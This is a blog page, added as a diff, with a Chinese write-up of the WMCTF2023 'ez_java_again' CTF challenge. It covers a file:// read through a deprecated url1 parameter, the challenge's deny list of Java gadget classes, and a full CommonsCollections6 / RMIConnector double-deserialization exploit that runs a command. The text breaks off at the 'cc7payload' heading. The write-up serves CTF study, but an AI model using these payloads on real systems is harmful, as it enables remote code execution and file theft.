@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="无聊ini">
+    <meta name="author" content="follycat">
+    <meta name="referrer" content="no-referrer" />
+    
+    <title>
+        
+            WMCTF2023-ez_java_again(RMIConnector二次反序列化) |
+        
+        follycatのblog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/wul.jpg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"follycatのblog","author":"follycat","avatar":"/images/wul.jpg","logo":"/images/wul.jpg","favicon":"/images/wul.jpg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"If you're reading this, welcome to my blog!","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/wul.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               follycatのblog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        WMCTF2023-ez_java_again(RMIConnector二次反序列化)
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/wul.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">follycat</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-05-30 19:37:45</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Fri May 30 2025 19:38:23 GMT+0800">2025-05-30 19:38:23</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8Cctf/">java反序列化，ctf</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.4k Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>12 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里用的是<a class="link" target="_blank" rel="noopener" href="https://www.yuque.com/dat0u/ctf/en3rym0131fuby60#">CTF复现计划<i class="fas fa-external-link-alt"></i></a>里的docker进行搭建的。</p>
+<p>docker命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p 12345:8080 -e FLAG=flag&#123;8382843b-d3e8-72fc-6625-ba5269953b23&#125; lxxxin/wmctf2023_ezjavaagainrev</span><br></pre></td></tr></table></figure>
+
+
+<p>访问12345端口即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748238809689-fd7d956a-cca1-4d8c-99a7-7ca22c21dfbb.png"></p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>首先看到题目中有一个按钮，点击后没啥反应，随后进行查看源代码以及抓包。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748238925367-17f974a6-37dc-4c30-8201-e2068d42f724.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748238946993-6d4b55b7-8351-44c4-b637-c58180bb3e42.png"></p>
+<p>抓包到了url参数，并且源码中有url1这个参数，并说明了有安全问题已经被废弃掉了。</p>
+<p>因此使用url1这个参数来进行文件读取。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Imagefile?url1=file:///usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/ctf/help_me/%23java</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748240050533-15d46bde-8f7a-4987-b43b-b6720152c175.png"></p>
+<p>将这俩个文件夹里的文件都读取出来，这个环境里面的.class文件都可以直接读取然后直接放到idea里面查看源码。</p>
+<p>直接看他造成反序列化的CmdServlet.class这个类</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748240531409-51e32521-3ab4-4c28-9d14-a085a2cb0ac1.png"></p>
+<p>其中过滤在<code>/WEB-INF/classes/config/serialkiller.xml</code>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!-- serialkiller.conf --&gt;</span><br><span class="line">&lt;config&gt;</span><br><span class="line">    &lt;refresh&gt;6000&lt;/refresh&gt;</span><br><span class="line">    &lt;mode&gt;</span><br><span class="line">        &lt;!-- set to &#x27;false&#x27; for blocking mode --&gt;</span><br><span class="line">        &lt;profiling&gt;false&lt;/profiling&gt;</span><br><span class="line">    &lt;/mode&gt;</span><br><span class="line">    &lt;logging&gt;</span><br><span class="line">        &lt;enabled&gt;false&lt;/enabled&gt;</span><br><span class="line">    &lt;/logging&gt;</span><br><span class="line">    &lt;blacklist&gt;</span><br><span class="line">        &lt;!-- ysoserial&#x27;s CommonsCollections1,3,5,6 payload  --&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections\.Transformer$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.InstantiateFactory$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections\.functorsFactoryTransformer$&lt;/regexp&gt;</span><br><span class="line"></span><br><span class="line">        &lt;regexp&gt;javax\.management\.BadAttributeValueExpException$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections\.keyvalue\.TiedMapEntry$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.ChainedTransformer$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TrAXFilter$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;java\.security\.SignedObject$&lt;/regexp&gt;</span><br><span class="line"></span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections\.Transformer$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.InstantiateFactory$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections\.functorsFactoryTransformer$&lt;/regexp&gt;</span><br><span class="line">        &lt;!-- ysoserial&#x27;s CommonsCollections2,4 payload  --&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.beanutils\.BeanComparator$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections\.Transformer$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;com\.sun\.rowset\.JdbcRowSetImpl$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;java\.rmi\.registry\.Registry$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;java\.rmi\.server\.ObjID$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;java\.rmi\.server\.RemoteObjectInvocationHandler$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.springframework\.beans\.factory\.ObjectFactory$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.springframework\.core\.SerializableTypeWrapper\$MethodInvokeTypeProvider$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.springframework\.aop\.framework\.AdvisedSupport$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.springframework\.aop\.target\.SingletonTargetSource$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.springframework\.aop\.framework\.JdkDynamicAopProxy$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.springframework\.core\.SerializableTypeWrapper\$TypeProvider$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.springframework\.aop\.framework\.JdkDynamicAopProxy$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;java\.util\.PriorityQueue$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;java\.lang\.reflect\.Proxy$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;javax\.management\.MBeanServerInvocationHandler$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;javax\.management\.openmbean\.CompositeDataInvocationHandler$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;java\.beans\.EventHandler$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;java\.util\.Comparator$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.reflections\.Reflections$&lt;/regexp&gt;</span><br><span class="line">    &lt;/blacklist&gt;</span><br><span class="line">    &lt;whitelist&gt;</span><br><span class="line">        &lt;regexp&gt;.*&lt;/regexp&gt;</span><br><span class="line">    &lt;/whitelist&gt;</span><br><span class="line">&lt;/config&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据批注以及xml文件可以发现其中过滤了<code>ChainedTransformer，TrAXFilter</code>等类，将cc1-6基本上全ban了，但是他没有禁用<code>InvokeTransformer</code>这一关键类以及cc7这条链的入口点函数，说明这个类以及cc7的入口点应该是解题必备的。</p>
+<p>根据上面的思路进行构造，将cc7的入口点直接和<code>InvokeTransformer</code>进行组合操作，中间不调用<code>ChainedTransformer</code>，但是现在是有一个问题的，就是runtime是无法序列化的，又不能调用<code>ChainedTransformer</code>，所以这里需要一个新的可以执行命令的方法，又或者可以进行二次反序列化，因此这里使用RMI二次反序列化进行绕过。</p>
+<h3 id="RMIConnector二次反序列化"><a href="#RMIConnector二次反序列化" class="headerlink" title="RMIConnector二次反序列化"></a>RMIConnector二次反序列化</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>RMIConnector是RMI中负责远程连接的类，位于<code>javax.management.remote.rmi.RMIConnector</code>。</p>
+<p>首先看到其<code>findRMIServerJRMP</code>方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748593502894-afc88f02-fb4d-426e-ba45-8beda0924d04.png"></p>
+<p>可以发现其接受一个base64的字符串并将其解密并进行了反序列化操作，也就是<code>oin.readObject();</code>继续向上找谁调用了<code>findRMIServerJRMP</code>，并且传入的base64是可控的，找到<code>findRMIServer</code>这个方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748593888824-9eb1f951-063d-4733-9b93-58bc6a9f359a.png"></p>
+<p>可以发现，当path开头为&#x2F;stub&#x2F;时将会调用<code>findRMIServerJRMP</code>，并且将传入截取之后的path，继续向上寻找，找到connct中调用了该方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748594212900-3461c65c-4cfb-4f49-9997-a6ab12282798.png"></p>
+<p>当然调用条件为rmiServer&#x3D;null，寻找可以让rmiServer为null的构造方法，找到RMIConnector</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748594535580-9d37afc4-34a8-49db-83c8-fdd80541e4dc.png"></p>
+<p>其只构造<code>JMXServiceURL</code>和<code>environment</code>完美符合条件。</p>
+<p>所以只需要构造成这样，然后可以使用cc链对rmiConnector的connct方法进行调用即可触发二次反序列化。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);</span><br><span class="line">setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/base64string&quot;);</span><br><span class="line">RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);</span><br></pre></td></tr></table></figure>
+
+<p>因为不需要多次调用invokerTransformer，所以无需使用chainedTransformer，那就会又有一个问题，就是transform的key(input)应该如何传入。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748595837726-6d70a913-6651-4807-a612-452e6859f945.png"></p>
+<p>如果可以使用TiedMapEntry的话可以直接将需要的类传给他的第二个参数，由于没有<code>ConstantTransformer</code>，这将会直接改变key的值(cc1中ConstantTransformer的作用)。</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>payload_cc6：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">package org.example.RMIConnector;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.remote.JMXServiceURL;</span><br><span class="line">import javax.management.remote.rmi.RMIConnector;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class RMIConnector2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);</span><br><span class="line">        setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/&quot;+getCC6Payload(&quot;calc&quot;));</span><br><span class="line">        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap =  LazyMap.decorate(map,new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,rmiConnector);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map1 = new HashMap&lt;&gt;();</span><br><span class="line">        map1.put(tiedMapEntry,&quot;aaa&quot;);</span><br><span class="line">        lazymap.remove(rmiConnector);</span><br><span class="line">        setFieldValue(lazymap,&quot;factory&quot;, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        Serialize(map1);</span><br><span class="line">        Unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static String getCC6Payload(String cmd) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(&quot;useless&quot;));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry, &quot;def&quot;);</span><br><span class="line">        //修改为HashSet调用readObject方法</span><br><span class="line">        HashSet&lt;Object&gt; hashSet = new HashSet&lt;&gt;();</span><br><span class="line">        setFieldValue(hashSet, &quot;map&quot;, hashMap2);</span><br><span class="line">        lazyMap.remove(&quot;abc&quot;);</span><br><span class="line">        setFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);</span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(hashSet);</span><br><span class="line">        return Base64.getEncoder().encodeToString(barr.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void Serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object Unserialize(String Filename) throws IOException,ClassNotFoundException&#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = objectInputStream.readObject();</span><br><span class="line">        return obj;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当然在这个题中TiedMapEntry是被禁用了的，同上面的思路还是使用cc7的入口点来调用RMIConnector。</p>
+<p>这里需要注意一点的就是key的设置，由于这里没有TiedMapEntry，所以key是无法直接反射进行传参的，并且LazyMap是基于hashMap1和hashMap2进行懒加载的，所以在实际储存和访问key时需要先反射来访问hashMap1中的table数组，从中获取到我们需要修改的key的Node对象(这个对象中包含了key和value)，对该node对象进行反射修改key。</p>
+<p>通过调试首先可以看到table数组中的值为node对象</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748597513246-524f4a4f-33b0-4c8d-b258-bd1644c25f29.png"></p>
+<p>然后看到其中的key和value</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748597823093-8a4450fc-9d8c-442a-990f-6da5fc2a8b8a.png"></p>
+<p>继续调试，发现key从1被替换为rmiConnector</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1748597943446-f44f2a6b-4a3f-46bc-b277-01b69007581e.png"></p>
+<p>cc7payload</p>
